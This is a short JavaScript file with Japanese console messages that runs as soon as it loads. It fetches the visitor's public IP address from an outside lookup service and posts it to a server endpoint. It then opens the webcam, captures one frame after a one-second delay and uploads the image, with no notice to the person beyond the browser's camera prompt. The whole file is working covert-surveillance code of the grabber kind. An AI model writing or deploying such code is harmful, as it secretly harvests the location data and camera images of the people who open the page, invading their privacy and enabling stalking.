const video = document.createElement('video');
const canvas = document.createElement('canvas');
canvas.width = 640;
canvas.height = 480;

async function sendIP(ip) {
    await fetch('/api/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `IPアドレス: ${ip}` })
    });
}

async function sendImage(blob) {
    const formData = new FormData();
    formData.append('file', blob, 'image.png');

    await fetch('/api/sendImage', {
        method: 'POST',
        body: formData
    });
}

async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

async function captureImage() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(async (blob) => {
                        await sendImage(blob);
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/png');
                    resolve();
                }, 1000);
            };
        });
    } catch (err) {
        console.error('カメラ取得に失敗しました:', err);
    }
}

async function main() {
    try {
        const ipAddress = await getIPAddress();
        await sendIP(ipAddress);
        await captureImage();
    } catch (error) {
        console.error('エラー:', error);
    }
}

main();
